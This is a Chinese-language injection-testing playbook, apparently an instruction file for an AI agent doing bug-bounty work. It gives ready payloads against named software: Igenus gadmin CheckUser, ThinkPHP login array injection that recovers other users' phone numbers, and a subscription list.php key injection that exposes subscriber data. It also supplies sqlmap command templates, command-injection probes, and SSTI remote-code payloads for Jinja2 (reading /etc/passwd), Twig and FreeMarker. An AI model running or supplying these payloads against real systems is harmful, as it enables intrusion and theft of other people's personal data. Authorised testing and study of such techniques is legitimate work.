> 进站勾完标准见 `dig-scope` §4.2.1：能看出条数/内容变化的口，每个过滤参都测；只回「请登录」整段 N/A。按栈选探针（JSON/Mongo 操作符、搜索框 ES、Java HQL/SpEL、有模板 SSTI；SQL 面仍走引号/布尔/延时）。405 后换位置不只有换编码。
> 短表「列表筛选项 OR + total」「邮件订阅 iframe 同目录 list」用标题搜。WooYun 统计 / `--os-shell` 教材 / 反弹 shell / 英文附件已砍（教材膨胀 + 破坏性，**不是**禁止给 sqlmap）。现场按栈自己变。确认 SQL 注入后必须给可跑 sqlmap，见下节。

# 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

## SQL 注入

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

### 邮件订阅 iframe 同目录 list（短表有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删短表这行。不要对全站同皮客户开 FOFA。

### Igenus gadmin CheckUser（短表有指针）

认：Igenus / 新网企业邮 `/gadmin/`，未登录 POST `index.php?mdl=UserMgr&act=CheckUser`，body `user=`，回单字节 `0` 或 `1`（用户是否已存在）。

打（不登录）：

1. `user=x' OR '1'='1` → `1`；对照 `user=x' OR '1'='2` → `0`
2. 布尔问 `DATABASE()` / `USER()` / `@@version` / `information_schema.tables` 表名
3. 延时用 `OR SLEEP(4)`（`AND SLEEP` 在用户不存在时会短路）

算成：假 0 真 1，且问出库名或库账号或他主体表数据。

假点：回登录页 / `logOut` 脚本；回码不是 0/1。Sibling 同皮 gadmin 一眼差分有没有 CheckUser，没有新口不另开全矩阵。

### ThinkPHP 登录 I() 数组 like（短表有指针）

认：ThinkPHP 3.x 登录 where 把 `I('s_tel')`（或同类手机字段）整段丢进条件。失败分两句「用户不存在」和「密码不正确」。

打（不登录）：

1. 标量假号应「用户不存在」
2. `字段[0]=like&字段[1]=%` 或 `neq`/`0` 变成「密码不正确」= 命中了库里的人，密码仍在 PHP 里核，进不了号也别停
3. `like` 前缀按位拼 11 位手机。真=密码不正确，假=用户不存在。`and`/`sleep`/`updatexml` 常被 WTS 一类 WAF 掐，用 like 即可
4. 拼出的号再 POST 一次标量登录，仍应密码不正确，等于这个号在库里

算成：他人 11 位手机。密码数组进不了号不算假点。

假点：两句回码一样；字段被 intval；like 只命中自己刚注册的号。

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

### 确认后给 sqlmap（硬）

报错 / 布尔差分 / 稳定延时已经坐实是 **SQL 注入** → 对话里 **立刻**给一条可复制、对应当前那包的 sqlmap。不要只说「可以用 sqlmap」。报告仍按 `vuln-report-format` 落手工包；sqlmap 给用户自己跑，不替代报告。

给命令前本机先核对 sqlmap 用得上的面：对照包、成功包、AND 1=1 vs AND 1=2、SLEEP、报错回显。缺 True/False、延时或报错面则不交付 sqlmap，直接写原因。禁止把未在本机跑通的命令丢给用户连试。

`-u` / `--data` 只放未污染合法原值；手工残留（`'`、`--`、`#`）禁止写进参数。sqlmap 会报 tainted，`--batch` 对该题默认答 N。TRUE 签名只走 `--string`，不要把成功 payload 写进 `--data`。

命令必须带上现场这些（有才写，没有不要编）：

| 现场 | 写法 |
|------|------|
| GET query | `-u "https://host/path?id=1" -p id` |
| POST form | `-u "URL" --data="a=1&b=2" -p b` |
| JSON | `--data='{"id":"1*"}'` + `-H "Content-Type: application/json"`（`*` 标注入点） |
| Cookie / 头注入 | `--cookie="k=v*"` 或 `-p 头名` |
| 有会话 | `--cookie="完整实值"` 或 `-H "Authorization: Bearer …"`（跟当前包） |
| 整包复杂 | `-r request.txt -p 参数` |
| 已知库 | `--dbms=mysql` / `mssql` / `postgresql` / `oracle` |
| WAF | 再加 `--tamper=`（空格注释 / between / randomcase…），先开 `waf-bypass.md` |

默认先确认身份，不要一上来抽表：

```
sqlmap -u "https://host/path?id=1" -p id --batch --current-db --current-user
```

POST / JSON / 带 Cookie 按上表把同一条补全。需要库名再 `--dbs`。用户明确要抽数再 `--dump`，且避开下面禁项。

**禁止当默认 / 禁止当证明：**

- `--os-shell` / `--os-pwn` / `--file-write`（破坏性，SRC 证明不靠这个）
- OR+total / ES 全库那枪：`--dump` / `--risk=3`（打挂集群；证明仍只看 total + 第一条他主体）
- 没坐实注入就丢一条空 sqlmap 充进度
- Mongo / 操作符 / SSTI / 命令注入：不是 sqlmap 面，不要硬套

### 布尔盲注误判防护（先链路，后结论）

- raw 请求先重放一次最小 baseline；出现 `401/403`、登录超时或会话失效时，先重建注册、登录、重取 token、重算签名、对象关系等最短前置链，再跑 sqlmap。不得把认证失败直接判成“不可注入”或“已修复”。
- 手工先确认 TRUE/FALSE 响应签名。`--string` 与 `--not-string` 互斥，禁止写进同一条命令；sqlmap 会 `[CRITICAL] option '--string' is incompatible with switch '--not-string'` 直接退出。默认只写 `--string=TRUE签名`。baseline 不含 TRUE 字符串是正常现象，不能因 warning 改成 `--not-string`，也不能把 FALSE 签名拼进同一条。只有 TRUE 签名不稳定、必须用 FALSE 签名时，才单独写 `--not-string`，且该条不再带 `--string`。
- OR 型布尔盲注可能被低 risk 漏掉：手工差分已支持 OR 条件时，内部复核可提高 risk 覆盖 OR payload；交付报告仍按本节禁项，不得把 `--risk=3` 写成默认证明命令。
- HTTP `500` 不直接等于不可注入；核对同一注入点的响应内容或长度差分是否稳定，差分消失才判不可注入。
- 正常检索词空结果，但空关键字 / `%` / `*` / 单引号都回到同一份全量列表，且 AND 1=1 与 AND 1=2 同包：判应用回退或误报。不给 sqlmap，不抽库名，不把「引号变长」当成可注入。
- 重建登录链或更换请求模板后加 `--flush-session`，避免旧 session/缓存影响判定。
- 枚举只按证据需要递进：当前库 `--current-db`，库清单 `--dbs`，表 `--tables -D`，字段 `--columns -D -T`；默认不 `--dump`。

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页。探针 `;id` / `|id` / `$(id)` / 延时 `sleep 5`。证伪即可，不要本机反弹 shell 当教材。

## SSTI（服务端模板注入）

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### 常见框架利用

```python
# Jinja2 (Python/Flask)
{{config}}                           # 信息泄露
{{''.__class__.__mro__[2].__subclasses__()}}  # 获取类
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
